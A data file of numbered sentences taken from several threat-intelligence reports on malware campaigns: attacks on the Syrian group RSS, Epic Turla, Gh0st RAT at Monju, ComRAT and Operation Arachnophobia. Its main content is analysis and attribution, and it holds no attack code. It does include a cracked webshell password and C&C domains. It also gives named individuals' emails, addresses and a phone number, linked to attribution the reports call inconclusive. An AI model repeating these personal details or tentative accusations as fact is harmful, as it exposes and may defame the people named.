) , and adds a Technical Sophistication value for the attack as a multiplier .", "6782": "Taken together it rates a 3 for Targeting Sophistication and a 1.25 for Technical Sophistication by our metric , yielding a TTI score of 3.75 .", "6783": "Citizen Lab research using the TTI has found that , despite low levels of technical sophistication , with well-crafted social engineering malware attacks remain highly effective against civil society groups .", "6784": "More information is available about the TTI in a recent Usenix Security paper .", "6785": "There are at least three possible sources for this malware attack : We evaluate each of these possibilities in turn , drawing on the information available to us after almost three years of tracking regime-linked malware .", "6786": "Pro-regime malware actors have continually targeted the Syrian opposition with waves of malware since at least late 2011 .", "6787": "Those campaigns have been extensively reported on by a range of groups , including Kaspersky , FireEye , Citizen Lab , the Electronic Frontier Foundation , and many others .", "6788": "Regime-linked malware has a number of common features that typically serve as distinguishing characteristics : Social engineering focusing on the needs and interests of the opposition .", "6789": "Frequent use of Dynamic DNS providers like no-ip .", "6790": "These characteristics are not all present in every sample , but we have typically found one or more in almost every binary we have examined that is Syrian regime-linked .", "6791": "This malware attack differs from known regime-linked groups in each of these elements .", "6792": "Nor does it have RAT functionality .", "6793": "The lack of overlap in Tactics , Techniques , and Procedures ( TTPs ) between this attack and prior attacks does not rule out Syrian regime-linked attackers .", "6794": "It is possible that regime-linked groups are trying a new approach .", "6795": "However , given that known regime-linked groups continued to remain active during the same date range using familiar TTPs , this scenario seems unlikely .", "6796": "In addition , it would be strange for regime-linked malware groups to undertake significant effort to prepare and send an implant that has significantly less functionality than what they commonly use .", "6797": "Taken together , we find this evidence supports the hypothesis that familiar regime-linked groups did not conduct the attack .", "6798": "RSS operates in territory controlled by ISIS , and has faced extensive targeting by ISIS .", "6799": "Currently , they appear to be directly targeted by ISIS for kidnappings and other retaliation , including executions .", "6800": "In addition , ISIS supporters have explicitly suggested that the group is under surveillance and actively hunted .", "6801": "Together this evidence suggests that ISIS has a strong motivation for using social engineering and/or malware to locate the members of RSS .", "6802": "We think there are several features of the malware attack that align with the needs and constraints of ISIS and its supporters in Ar-Raqqah , more so than other groups , as we understand them .", "6803": "The social media activity of members of RSS is often highly public .", "6804": "Their location and exact membership , however , is secret .", "6805": "We speculate that if an attacker were interested in maintaining long-term surveillance of the activities of RSS they could have employed a RAT .", "6806": "However , if the attacker were interested in unmasking the location of its targets so they could be physically tracked down , collecting IP data and system info would be a more reasonable approach .", "6807": "ISIS or its supporters clearly have a strong interest in the ( rudimentary ) location tracking of the members of RSS that this malware provides .", "6808": "Internet connectivity in Raqqah is extremely limited , and some of it is under ISIS control .", "6809": "Knowing the IP address of a target could quickly narrow down targets to specific locations , and specific Internet services , or Internet cafes in Raqqah .", "6810": "Given that the identities and locations of RSS members are closely guarded , such information would hold significant intelligence value for ISIS .", "6811": "Armed with this kind of information , ISIS could physically harm people within Raqqah ( and it is also possible that they have the ability to operate in some capacity in border areas of Turkey ) .", "6812": "Little is publicly known about the technical capabilities of ISIS and its supporters ; however , reports have begun to emerge suggesting that ISIS is interested in expanding its abilities .", "6813": "In addition , ISIS has reportedly gained the support of at least one individual with some experience with social engineering and hacking : Junaid Hussain ( aka TriCk ) , a former member of teamp0ison hacking team .", "6814": "While Mr. Hussain and associates have reportedly made threats against Western governments , it is possible that he or others working with ISIS have quietly supported an effort to identify the targeted organization , which is a highly visible thorn in the side of ISIS .", "6815": "It is possible that the attack is the product of actors working for unknown purposes and targeting RSS .", "6816": "Given the activities of RSS , however , it is unclear who this might be .", "6817": "It is not possible , for example , to reject the theory that some unknown group within the FSA , or other groups opposing the Assad regime are responsible .", "6818": "Citizen journalists in Ar-Raqqah were previously critical of arbitrary arrests carried out by non-ISIS groups in 2013 .", "6819": "However , it is unclear why those groups , which no longer control Ar-Raqqah , would be interested in RSS in November 2014 .", "6820": "It is likely that third party actors , including several intelligence services , are closely monitoring various actors in the conflict through a range of electronic means .", "6821": "However , there is little reason to suggest that they would use a tailored but technically rudimentary attack to target RSS in particular .", "6822": "After considering each possibility , we find strong but inconclusive circumstantial evidence to support a link to ISIS .", "6823": "However , we are unable to connect this attack directly to ISIS , Mr. Hussain , or other ISIS supporters .", "6824": "If indeed ISIS or its supporters are responsible , it seems reasonable that such an offensive capability may still be in development .", "6825": "We hope that publishing this report will draw attention to a new and concerning threat that includes ISIS critics among its targets .", "6826": "If ISIS is responsible , while this attack targets in-country impediments to ISIS objectives , other targets may include ideological or military adversaries abroad .", "6827": "Whether or not ISIS is responsible , this attack is likely the work of a non-regime threat actor who may be just beginning to field a still-rudimentary capability in the Syrian conflict .", "6828": "The entry costs for engaging in malware attacks in a conflict like the Syrian Civil War are low , and made lower by the fact that the rule of law is nonexistent for large parts of the country .", "6829": "In still other parts ( under regime control ) , malware attacks appear to be state sanctioned .", "6830": "Citizen Lab research into targeted digital threats against civil society confirms that civil society groups face grave threats from targeted malware attacks , despite being under-resourced to defend against them .", "6831": "The case highlighted here is no exception : lack of IT and security resources have made it difficult for the Syrian opposition to address targeted and persistent digital threats against them .", "6832": "In addition , if ISIS is indeed responsible , this case suggests how easy it is for belligerents in a conflict to begin fielding basic offensive digital capabilities , and how quickly the capabilities can be pointed at unarmed civil society groups .", "6833": "As most organizations working on issues surrounding Syria are aware , malware delivered with good social engineering is a constant source of danger .", "6834": "This particular attack can be prevented by not opening files sent by unknown persons .", "6835": "However , many attacks in Syria come from hijacked accounts and impersonate people known to the targets .", "6836": "Social engineering remains an unsolved problem , and continues to compromise groups throughout the Syrian opposition and their supporters .", "6837": "This attack reaffirms the dangers posed by social engineering attacks , whether they deliver phishing campaigns or malware .", "6838": "The circumstantial evidence of ISIS involvement suggests that groups working on topics that ISIS considers a threat , and their partner organizations and supporters , should urgently examine their security policies and assess the possible risks to their operations , and the consequences of exposure of sensitive information to ISIS .", "6839": "Even if the link to ISIS turns out to be incorrect , it is possible that this will be a threat in the future .", "6840": "Individuals and groups at risk can also consult materials in Arabic provided by Cyber Arabs including a series of very accessible videos on digital security .", "6841": "The malware files Files dropped by the malware Collected Information Files ( unencrypted ) Exfiltrated file ( encrypted ) Registry Keys Acknowledgements : We are grateful to Cyber Arabs and the Institute for War and Peace Reporting for their critical work and assistance .", "6842": "Special thanks to : several anonymous Syrians , Masashi Crete-Nishihata , Sarah McKune , Morgan Marquis-Boire , Ron Deibert , Bill Marczak , Nart Villeneuve , Irene Poetranto , and Kristen Dennesen .", "6843": "Support for this research is provided by grants from the John D. and Catherine T. MacArthur Foundation and the Ford Foundation .", "6844": "Over the last 10 months , Kaspersky Lab researchers have analyzed a massive cyber-espionage operation which we call '' Epic Turla '' .", "6845": "The attackers behind Epic Turla have infected several hundred computers in more than 45 countries , including government institutions , embassies , military , education , research and pharmaceutical companies .", "6846": "The attacks are known to have used at least two zero-day exploits : We also observed exploits against older ( patched ) vulnerabilities , social engineering techniques and watering hole strategies in these attacks .", "6847": "When G-Data published on Turla/Uroburos back in February , several questions remained unanswered .", "6848": "One big unknown was the infection vector for Turla ( aka Snake or Uroburos ) .", "6849": "The attacks are still ongoing as of July 2014 , actively targeting users in Europe and the Middle East .", "6850": "Note : A full analysis of the Epic attacks is available to the Kaspersky Intelligent Services subscribers .", "6851": "Watering holes ( waterholes ) are websites of interest to the victims that have been compromised by the attackers and injected to serve malicious code .", "6852": "So far we have n't been able to locate any e-mail used against the victims , only the attachments .", "6853": "The PDF attachments do not show any '' lure '' to the victim when opened , however , the SCR packages sometime show a clean PDF upon successful installation .", "6854": "Some of known attachment names used in the spearphishing attacks are : In some cases , these filenames can provide clues about the type of victims the attackers are targeting .", "6855": "Some of the injected websites include : In total , we observed more than 100 injected websites .", "6856": "Currently , the largest number of injected sites is in Romania .", "6857": "Here 's a statistic on the injected websites : The distribution is obviously not random , and it reflects some of the interests of the attackers .", "6858": "For instance , in Romania many of the infected sites are in the Mures region , while many of the Spanish infected sites belong to local governments ( City Hall ) .", "6859": "Most of the infected sites use the TYPO3 CMS ( see : http : //typo3.org/ ) , which could indicate the attackers are abusing a specific vulnerability in this publishing platform .", "6860": "] au '' .", "6861": "For a full list of C & C servers , please see the Appendix .", "6862": "The Epic Turla attackers are extremely dynamic in using exploits or different methods depending on what is available at the moment .", "6863": "The attackers operate the mothership using a network of proxies and VPN servers for anonymity reasons .", "6864": "We were able to get a copy of one of the motherships , which provided some insight into the operation .", "6865": "To change the file , they are using the '' Task editor '' from the menu .", "6866": "Some other unknown IPs were also observed in the targeting schedules .", "6867": "There is also an '' except.css '' file where attackers log the reasons they did n't try to exploit certain visitors .", "6868": "This makes the analysis more difficult .", "6869": "This exploit only works on unpatched Microsoft Windows XP systems .", "6870": "Other known detection names for the backdoor is Trojan.Wipbot ( Symantec ) or Tavdig .", "6871": "The malware behavior is defined by a configuration block .", "6872": "The configuration block usually contains two hard-coded C & C URLs .", "6873": "He have also seen one case where the configuration block contains just one URL .", "6874": "Most samples , especially old ones , have the ID 1156fd22-3443-4344-c4ffff .", "6875": "files recursively is also a common '' theme '' : In total , we have decoded several hundreds of these command packages delivered to the victims , providing an unique insight into the inner workings of the attackers .", "6876": "In addition to generic searches , some very specific lookups have been observed as well .", "6877": "This scheme was implemented in April 2014 .", "6878": "Note : the filename can change across victims .", "6879": "On one Central Asian government 's Ministry of Foreign Affairs victim system , the filename used was '' adobe32updt.exe '' .", "6880": "In addition to these custom tools , we observed the usage of standard administration utilities .", "6881": "In several cases , an interesting update has been observed -- a malware from a different , yet related family .", "6882": "Several plugins for the '' Carbon system '' are known to exist .", "6883": "Note : the command and control servers www.losguayaberos [ .", "6884": "] com and thebesttothbrushes [ .", "6885": "] com have been sinkholed by Kaspersky Lab .", "6886": "The plugins for the Carbon system can be easily recognized as they always feature at least two exports named : Several Epic backdoors appear to have been designed to work as Carbon system plugins as well - they require a specialized loader to start in victim systems that do not have the Carbon system deployed .", "6887": "Some modules have artifacts which indicate the Carbon system is already at version 3.x , although the exact Carbon system version is very rarely seen in samples : The author of the Carbon module above can be also seen in the code , as '' gilg '' , which also authored several other Turla modules .", "6888": "We are planning to cover the Turla Carbon system with more details in a future report .", "6889": "Internally , the backdoor is named '' Zagruzchick.dll '' : The word '' Zagruzchick '' means '' boot loader '' in Russian .", "6890": "The Control panel for the Epic motherships also sets the language to codepage '' 1251 '' : Codepage 1251 is commonly used to render Cyrillic characters .", "6891": "The threat actor behind the '' Epic '' operation uses mainly hacked servers to host their proxies .", "6892": "The hacked servers are controlled through the use of a PHP webshell .", "6893": "This shell is password protected ; the password is checked against an MD5 hash : The MD5 '' af3e8be26c63c4dd066935629cf9bac8 '' has been solved by Kaspersky Lab as the password '' kenpachi '' .", "6894": "Once again , it is also interesting to point out the usage of Codepage 1251 in the webshell , which is used to render Cyrillic characters .", "6895": "There appears to be several links between Turla and Miniduke , but we will leave that for a future blogpost .", "6896": "This is the country distribution for the top 20 affected countries by victim 's IP : According to the public information available for the victims ' IPs , targets of '' Epic '' belong to the following categories : When G-Data published their Turla paper , there were few details publicly available on how victims get infected with this malware campaign .", "6897": "Our analysis indicates this is a sophisticated multi-stage infection ; which begins with Epic Turla .", "6898": "Most recently , we observed this attack against a Kaspersky Lab user on August 5 , 2014 , indicating the operation remains fresh and ongoing .", "6899": "Note : A full analysis of the Epic attacks is available to the Kaspersky Intelligent Services customers .", "6900": "Contact : intelreports @ kaspersky.com We would like to add the following at the end of the blogpost , right before the detection names : If you 'd like to read more about Turla/Uroburos , here 's a few recommendations :", "6901": "Context Information Security distribute Context Threat Intelligence ( CTI ) reporting under the Traffic Light Protocol ( TLP ) , a method of classifying a document in order to promote the distribution of sensitive information between individuals , organisations or communities in a controlled and trusted way , based on the originator 's wishes .", "6902": "The various levels of the TLP are represented by the following colours : Sources may use TLP : RED when information can not be effectively acted upon by additional parties , and could lead to impacts on a party 's privacy , reputation , or operations if misused .", "6903": "Recipients may not share TLP : RED information with any parties outside of the specific exchange , meeting , or conversation in which it is originally disclosed .", "6904": "TLP : RED information will be passed verbally or in person .", "6905": "Sources may use TLP : AMBER when information requires support to be effectively acted upon , but carries risks to privacy , reputation , or operations if shared outside of the organisations involved .", "6906": "Recipients may only share TLP : AMBER information with members of their own organisation who need to know , and only as widely as necessary to act on that information .", "6907": "Sources may use TLP : GREEN when information is useful for the awareness of all participating organisations as well as with peers within the broader community or sector .", "6908": "Recipients may share TLP : GREEN information with peers and partner organisations within their sector or community , but not via publicly accessible channels such as publication or posting publicly on the Internet .", "6909": "Sources may use TLP : WHITE when information carries minimal or no foreseeable risk of misuse , in accordance with applicable rules and procedures for public release .", "6910": "Subject to standard copyright rules , TLP : WHITE information may be distributed freely , without restriction .", "6911": "On 2nd January 2014 a Systems Administrator at the Monju fast breeder reactor facility in Japan noticed suspicious connections emanating from a machine in the control room , coinciding with what was a seemingly routine software update to a free media player .", "6912": "The Japanese Atomic Energy Agency is investigating further .", "6913": "Gom Player originates in South Korea and in some parts of Asia it is a popular alternative to Windows Media Player .", "6914": "It is unclear whether every machine trying to download an update received this malware or whether only machines which fitted a certain profile were infected .", "6915": "The 'Gh0st RAT ' has been used extensively in attacks linked to the Chinese state , though it is important to remember that the code is publicly available and can be modified and used by anyone .", "6916": "The targeting of a Japanese nuclear facility however , is consistent with Chinese state intelligence requirements .", "6917": "If this is the work of a Chinese group then we feel the targeting may go much further than the Civil Nuclear sector and thus be of interest to the wider Energy Sector and industry as a whole .", "6918": "In order to inform the Energy Sector and beyond about this attack , we have compiled a technical summary of the attack and have provided a number of Indicators Of Compromise ( IOCs ) which can be used to aid detection .", "6919": "It is likely that the attackers would redeploy their implant against other targets , albeit with a delivery mechanism more tailored to the location of the intended victims .", "6920": "If this was indeed the case , then the nature of this attack is certainly more targeted than one that would cover the entire userbase of the GOM Player product , with victims comprising of the Japanese Government in addition to those at the Monju nuclear facility .", "6921": "Oddly , this file is padded with null bytes , resulting in a 25 megabyte file .", "6922": "Analysis of this malware revealed it to be a variant of the Gh0st RAT , often used by Chinese actors ( including those who are state-motivated or directly state-sponsored ) .", "6923": "Specifically , the initial five bytes of the communications ( often used to denote a campaign or victim ) are 'HTTPS ' , amended from the original 'Gh0st ' ; the same as the traffic produced by the VOHO Gh0st variant .", "6924": "To enable rapid response , the following Snort signature can be deployed : Additionally , the following Yara signature should identify both encoded payloads and the active implant in memory :", "6925": "In February 2014 , the experts of the G DATA SecurityLabs published an analysis of Uroburos , the rootkit with Russian roots .", "6926": "We explained that a link exists between Uroburos and the Agent.BTZ malware , which was responsible for '' the most significant breach of U.S. military computers ever .", "6927": "'' Nine months later , after the buzz around Uroburos , aka Snake or Turla , we now identified a new generation of Agent.BTZ .", "6928": "We dubbed it ComRAT and , by now , analyzed two versions of the threat ( v3.25 and v3.26 ) .", "6929": "As reported earlier this year , Agent.BTZ used the same encoding key and the installation log file name as Uroburos .", "6930": "ComRAT , in its version 3.25 , shows the same behavior .", "6931": "Taken everything into consideration , the indications we saw during our analyzes lead to the supposition that the group behind Agent.BTZ and Uroburos is still active and is pursuing the Agent.BTZ path once more to improve and change the RAT .", "6932": "The analyzed file is the latest version we identified : v3.26 .", "6933": "The version identification is described in the chapter '' Log files '' .", "6934": "The major difference between this version and the older version ( s ) will be described there .", "6935": "This file is the main payload of the malware .", "6936": "The two files are Microsoft Windows dynamic libraries .", "6937": "We noticed that the file name is still the same as the file name used by Agent.BTZ in the past .", "6938": "This library is the real payload .", "6939": "If the malware version is older than 3.26 , the xored key is the same as the dropper key .", "6940": "Concerning the version 3.26 , the malware uses a new non-ASCII key .", "6941": "Here is an example of decoded log file for the version 3.26 : We can identify the version of the malware thanks to the PVer flag .", "6942": "This domain is far from unknown , as it has been mentioned in BAE System 's Uroburos ( aka Snake ) analysis paper as C & C server domain for the Uroburos malware .", "6943": "Another connection between the cases .", "6944": "That is the reason why the sample is detected as Uroburos ( aka Turla ) .", "6945": "The same code was used by Agent.BTZ and also the dll loaded into userland during the Uroburos analysis .", "6946": "In version 3.26 , the author changed the key and remove the known file name .", "6947": "This action can be an indication for the developer 's effort to hide this connection .", "6948": "The main difference is the design .", "6949": "ComRAT is more complex and cleverer .", "6950": "It is by far a more complex userland design than Agent.BTZ .", "6951": "These differences , mainly the more complex design , lead us to give this malware a new name .", "6952": "The analyzed dropper of v3.25 has a compilation date of February 6th 2014 .", "6953": "The more recent dropper of v3.26 , which has all the mentioned changes implemented , reveals a compilation date of January 3rd 2013 .", "6954": "This analysis shows that even after the Uroburos publication in February 2014 , the group behind this piece of malware seems to be still active .", "6955": "In any case , the ComRAT developers implemented new mechanisms , changed keys , removed log files to hide their activities and tried to disguise the connections between the RAT ComRAT , the rootkit Uroburos and the RAT Agent.BTZ as much as possible .", "6956": "However , we can still follow the evolution of the malware by comparing the versions .", "6957": "The persistence mechanism discovered in October 2014 makes it possible to intrude into a system in a really discreet manner and we estimate that other actors will use the same persistence mechanism in the near future .", "6958": "We will definitely keep our ears and eyes open and continue analyzing .", "6959": "Cyber Squared Inc. 's ThreatConnect Intelligence Research Team ( TCIRT ) tracks a number of threat groups around the world .", "6960": "Beginning in the summer of 2013 , TCIRT identified a suspected Pakistani-origin threat group .", "6961": "This group was revealed by TCIRT publicly in August 2013 .", "6962": "In the months following the disclosure , we identified new activity .", "6963": "Cyber Squared partnered with experts at FireEye Labs to examine these new observations in an attempt to discover new research and insight into the group and its Operation '' Arachnophobia '' .", "6964": "The following report is a product of collaborative research and threat intelligence sharing between Cyber Squared Inc. 's TCIRT and FireEye Labs .", "6965": "\u2022 While we are not conclusively attributing BITTERBUG activity to Tranchulas or a specific Pakistani entity , we can confidently point to many characteristics of a Pakistan-based cyber exploitation effort that is probably directed against Indian targets and/or those who are involved in India-Pakistan issues .", "6966": "\u2022 Early variants of the BITTERBUG malware had build paths containing the strings '' Tranchulas '' and '' umairaziz27 '' .", "6967": "Tranchulas is the name of a Pakistani security firm ; Umair Aziz is the name of a Tranchulas employee .", "6968": "\u2022 Following the release of our blog post highlighting this activity and the malware 's build strings , the threat actors appear to have modified their binary file paths to make them more generic .", "6969": "\u2022 Employees at both the Pakistan-based hosting provider and Tranchulas appear within each others ' social networks .", "6970": "On August 2 , 2013 , the TCIRT published the blog '' Where There is Smoke , There is Fire : South Asian Cyber Espionage Heats Up '' in which TCIRT identified custom malware , later dubbed BITTERBUG by FireEye , suspected to be linked to Pakistani-based exploitation activity directed against Indian entities .", "6971": "We found debug path references to '' Tranchulas '' , which is also the name of a Pakistani security company .", "6972": "Tranchulas claims to support '' national level cyber security programs '' and the development of offensive and defensive cyber capabilities .", "6973": "At the time , the incident seemed to be an isolated one for TCIRT , but it was only the beginning .", "6974": "Our suspicions of Tranchulas ' involvement in the activity began to mount , based on a series of events that occurred both before and after the release of our blog post .", "6975": "During the past year , we communicated with Tranchulas and the Pakistan-based hosting provider .", "6976": "Suspicious responses and oddly similar replies received from both companies to our inquiries , as well as anomalies in their email headers , prompted us to research the companies further .", "6977": "Our research revealed : \u2022 The C2 hosting provider ( VPSNOC ) has likely been conducting business operations from within Pakistan , subleasing infrastructure from U.S. providers .", "6978": "\u2022 VPNSOC and Tranchulas employees have maintained some type of undefined relationship given connections via social media .", "6979": "\u2022 Both organizations have employed or are affiliated with personnel who have offensive cyber expertise .", "6980": "\u2022 When TCIRT was initially contacted by Tranchulas following our original blog post , they denied any involvement in the activity .", "6981": "Tranchulas maintained that they were being framed , and that they were already aware of the activity prior to both our blog post and our contact .", "6982": "However , inconsistencies in their claims and their responses made such a scenario questionable .", "6983": "TCIRT began tracking a set of activity involving a BITTERBUG variant in May 2013 .", "6984": "According to Whois records , those IP addresses were registered to a web-hosting firm in Kansas City , Missouri .", "6985": "Based on public records , this organization appears to be a legal entity chartered to conduct business in Missouri .", "6986": "On July 24 , 2013 , TCIRT contacted the Kansas City-based hosting provider to notify them of the malicious activities emanating from IP address 199.91.173.43 .", "6987": "The hosting provider subsequently introduced TCIRT to their client VPNSOC , the customer responsible for subleasing the IP address .", "6988": "Later that day , TCIRT received a response from support @ vpsnoc.com providing limited information on the server and related traffic ( Figure 2 ) .", "6989": "When TCIRT sent follow-up communications , VPSNOC did not respond , further increasing our suspicions .", "6990": "While reviewing the metadata of VPSNOC 's July 24 , 2013 email response , we noticed the email was sent from a +0500 time zone .", "6991": "This time zone usage is consistent with Pakistan 's time zone .", "6992": "The TCIRT published details of the initial activity in the aforementioned blog post on August 2 , 2013 .", "6993": "Four days later on August , 2013 , the Tranchulas Chief Executive Officer , Zubair Khan , contacted us regarding the blog post and its subsequent press coverage .", "6994": "Khan submitted '' ResponseThreatConnect.docx '' as an explanation of the observed activity to both the media and the TCIRT indicating that the debug paths using '' Tranchulas '' and '' umairaziz27 '' was '' done by developer of malware to portray wrong impression about Tranchulas and mislead malware analysts '' .", "6995": "Notably , Khan included a screenshot of an email message .", "6996": "The message was reportedly a response from VPSNOC to an email message from Tranchulas sent on July 21 , 2013 , purportedly to notify VPSNOC of the same malicious activity identified by TCIRT .", "6997": "However , we noted certain anomalies in this message .", "6998": "As seen in Figure 3 the '' email message '' was '' sent '' to VPSNOC from an unidentified tranchulas.com email address on '' Tue , Jul 21 , 2013 at 11:36 PM .", "6999": "'' July 21 , 2013 was not a Tuesday and in fact was a Sunday .", "7000": "The mismatched date suggests that this email message was potentially modified in order to support the claim that Tranchulas was aware of , and had already reported the exploitation activity .", "7001": "TCIRT speculates that '' Tuesday '' was hastily chosen because our own official notification to VPSNOC was sent on Wednesday the 24th .", "7002": "In addition , the '' response '' received by Tranchulas is nearly identical to that received by TCIRT .", "7003": "We believe that Tranchulas may have obtained information about TCIRT 's notification to VPSNOC through a pre-established relationship .", "7004": "The TCIRT responded to Mr. Khan 's official explanation with a follow-up inquiry , offering Khan an opportunity to explain the notable date inconsistency within the email screenshot .", "7005": "The TCIRT also requested that Mr. Khan share the actual email message with the original attached headers .", "7006": "Mr. Khan did not address the TCIRT question , but rather deferred our request to Mr. Hamza Qamar , a Penetration Testing Team Lead at Tranchulas .", "7007": "On August 15 , 2013 , three days later , Qamar responded to TCIRT with a brief denial of any modifications to the screenshot ( other than email address anonymization ) and specifically referred TCIRT back to VPSNOC support ( support @ vpsnoc.com ) for any follow up questions .", "7008": "Astonished by this dismissal and deflection , TCIRT immediately began to explore the relationship between VPSNOC and Tranchulas .", "7009": "During our research into VPSNOC , we identified that it is actually based in , or conducts partial operations from within , Pakistan .", "7010": "The company only gives the impression of operating from Kansas City through marketing and the use of leased IP space ( Figure 4 ) .", "7011": "The Whois records for vpsnoc.com revealed that the domain was registered by Digital Linx Hosting .", "7012": "Digital Linx is also a Pakistan-based hosting company ( Figure 5 ) .", "7013": "As seen in Figure 6 , the administrative email address is admin @ digitallinx.org .", "7014": "This is the same registrant record for the digitallinx.net domain .", "7015": "The domains digitillinx.org , digitallinx.net , and digitallinx.com share current and historical similarities in their WHOIS records and sitemap.xml files that imply they are all controlled by the same individual or entity .", "7016": "The domain digitallinx.com is registered to Muhammad Naseer Bhatti ( Digital Linx Founder ) who uses email addresses naseer @ digitallinx.com and nbhatti @ gmail.com .", "7017": "The domain is also registered to the address 638-F Johar Town , Lahore Pakistan .", "7018": "The contact telephone number listed on Digital Linx ' web site is 925-665-1427 ( Figure 6 ) , and is also used in the WHOIS record for defiantmarketing.com .", "7019": "The domain defiantmarketing.com is registered to Abunasar Khan .", "7020": "The registration lists VPSNOC as the registrant organization , abunasar @ yahoo.com as the registration email address , and House 12 , Street 21 , F-8/1 Islamabad Federal 44000 as the registration address .", "7021": "Abunasar Khan has been observed using the aliases '' agnosticon '' and '' agnostic '' .", "7022": "From this we were able to locate an advertisement in the Blackhatworld forum from April 2012 posted by agnosticon promoting VPSNOC and identifying it as a subdivision of Digital Linx Hosting ( Figure 7 ) .", "7023": "Though none of this information is surprising , it further suggests that both Bhatti and Abunasar Khan work or worked for Digital Linx and VPSNOC and during that time were both located in Pakistan .", "7024": "Additional research into Abunasar Khan identified several registered domains and fragments of his online presence .", "7025": "Based on his websites and account information , he appears to have an interest or participated in the Antisec and Anonymous movements ( Figure 8 ) .", "7026": "He also used '' anony mo us '' in the registration name field of a personal account .", "7027": "In addition , Abunasar Khan 's Google+ profile revealed connections to at least one Tranchulas employee , Hamza Qamar and a Digital Linx employee , Shoaib Riaz .", "7028": "Hamza Qamar , the Team Lead for Penetration Testing at Tranchulas , with whom TCIRT last spoke .", "7029": "Visiting Hamza Qamar 's Google+ page ( Figure 9 ) , the only directly connected person was Abunasar Khan .", "7030": "At this point , it shows that a probable VPNSOC employee with ties or interests in hacking has an undefined but potentially close relationship with Hamza Qamar , the Penetration Testing employee from Tranchulas .", "7031": "Qamar indicated on his public LinkedIn profile that he '' engaged in system and enterprise level network and Web application security testing for clients ranging from large federal agencies , DoD , and commercial clients '' , though it is unclear which '' DoD '' is referenced ( e.g. , whether the Pakistani Ministry of Defense or some other nation 's defense department ) .", "7032": "Tranchulas identifies government ( presumably Pakistan 's government ) as an operational sector for its work .", "7033": "Tranchulas ' offensive cyber initiative services are offered to '' national-level cyber security programs '' indicating commercial demand from '' national-level '' customers .", "7034": "Though Tranchulas brands itself as a multi-national company , with respective addresses within the United Kingdom , the United States , and New Zealand .", "7035": "We found evidence that these addresses are all associated with either virtual office spaces or address forwarding services .", "7036": "For further background information on these personas , please see Appendix F : Personas .", "7037": "\u2022 Tranchulas and VPNSOC were in direct communication at some point in July-August 2013 .", "7038": "\u2022 VPNSOC is a subsidiary of Digital Linx .", "7039": "\u2022 Tranchulas , VPNSOC , Digital Linx were all physically located in Pakistan but maintained virtual presence within the U.S. \u2022 Hamza Qamar was an employee of Tranchulas .", "7040": "\u2022 Muhammad Naseer Bhatti was the self-proclaimed founder of Digital Linx .", "7041": "\u2022 Abunasar Khan was affiliated with AntiSec and VPNSOC .", "7042": "\u2022 Digital Linx founder Muhammad Naseer Bhatti had at least a working relationship with VPNSOC employee Abunasar Khan \u2013 connected through domain registrations and a common Google+ profile for Shoaib Riaz ( another Digital Linx employee ) .", "7043": "\u2022 VPNSOC employee Abunasar Khan had a direct connection to Tranchulas employee Hamza Qamar through Google+ .", "7044": "Note : A walkthrough of our research is available in Appendices C , D and E. Metadata Analysis : As mentioned earlier , during the email exchanged with Zubair Khan , he sent TCIRT a Microsoft Word document ( .docx", "7045": ") .", "7046": "In reviewing the document metadata for '' ResponseThreatConnect.docx '' , TCIRT identified that it contained the creator properties of '' hp .", "7047": "'' TCIRT compared the metadata of two benign BITTERBUG-associated decoy documents from July 2013 and found that both also had the author of '' hp '' ( Figure 10 ) .", "7048": "CyberSquared Inc. partnered with FireEye for a second technical review of the malware associated with this activity .", "7049": ".", "7050": "The full malware report is included in Appendix A : Malware Details .", "7051": "The earliest evidence of the malware family dates to April 2013 , based on the Portable Executable ( PE ) compile times , with more than 10 BITTERBUG variants observed to date .", "7052": "The earliest samples of BITTERBUG contain the '' Tranchulas '' debug path ( below ) , as mentioned in the August 2013 TCIRT blog post .", "7053": "These BITTERBUG variants were probably used in attacks around summer 2013 , using possible lures related to the then-recent death of '' Sarabjit Singh '' ( an Indian national imprisoned in Pakistan ) and an Indian Government pension memorandum .", "7054": "As stated in the original blog ( and raised in the formal Tranchulas response ) , several binaries contain references to '' Cath '' in the debug path .", "7055": "It is important to note that the '' Cath '' files are support components and not BITTERBUG variants , so it is probable that these were developed by another party but are a required component of the family .", "7056": "Additional BITTERBUG variants were compiled in June and July 2013 that contained different identifiers in the debug paths : '' Cert-India '' ( 3 samples ) and '' umairaziz27 '' ( 1 sample ) .", "7057": "The presence of '' umairaziz27 '' in a debug path from one sample makes us wonder if this represents an operational security mistake .", "7058": "The debug path of '' umairaziz27 '' led us to Twitter and LinkedIn accounts ( on which a matching alias is used ) that belong to a Tranchulas employee named Umair Aziz , who identified himself as an Information Security Analyst and graduate of National University of Sciences and Technology ( NUST ) .", "7059": "After publication of the TCIRT blog and our communications with Tranchulas occurred in August 2013 , no new samples of BITTERBUG or its support components ( based on compile times ) were identified until September ( various support components ) and October ( a new BITTERBUG variant ) .", "7060": "Between September and December , we observed more variations of BITTERBUG and its support components in terms of packaging , host-based activities , and decoys ( or the lack of them ) compared to the samples before our blog post .", "7061": "This could indicate that the threat actors were aware of the blog post and modified their malware and related components to distance them from prior indicators .", "7062": "This SFXRAR contained the latest BITTERBUG variant , which had new dependencies on support components .", "7063": "We provide a more detailed report on this SFX and the related variant in Appendix A : Malware Details .", "7064": "Operation Arachnophobia consists of an apparent targeted exploitation campaign , dating back to early 2013 , using the BITTERBUG malware family and seemingly directed against entities involved in India-Pakistan issues .", "7065": "Research later identified that a Pakistan-based VPSNOC representative had a social network affiliation with a Tranchulas employee as well as apparent affiliations with the Anonymous and AntiSec movements .", "7066": "After the August 6 , 2013 blog , Tranchulas provided TCIRT and the media an official statement and explanation of BITTERBUG activity , however , this explanation contained discrepancies .", "7067": "The TCIRT addressed some of these discrepancies with Tranchulas personnel , who were unresponsive , increasing our suspicion of the activity .", "7068": "We later observed BITTERBUG activity following August 2013 with subtle changes that further generalized debug paths .", "7069": "It was this chain of events that served as a catalyst for extra scrutiny of the activity and collaboration between the ThreatConnect and FireEye Labs teams to share information .", "7070": "While we are not conclusively attributing BITTERBUG activity to Tranchulas or a specific Pakistani entity , we can confidently point to many characteristics of a Pakistan-based cyber exploitation effort that is probably directed against Indian targets or those who are involved in India-Pakistan issues .", "7071": "On the surface , BITTERBUG serves as an example of how threat actors mask their operations across social , cultural and geographic boundaries .", "7072": "More importantly , it demonstrates the value of threat intelligence sharing and industry collaboration .", "7073": "As one organization begins to pull at a thread of evidence and share their findings with another , a larger understanding and shared perspective is revealed .", "7074": "It is through this process that a shared awareness emerges into a larger , more comprehensive story that explains what we are seeing and why - ultimately it is this story that better serves us all .", "7075": "The timeline below is of BITTERBUG activity from May 2013 through March 2014 .", "7076": "An example beacon request is shown in Figure 14 .", "7077": "The purpose of the first three files is unknown .", 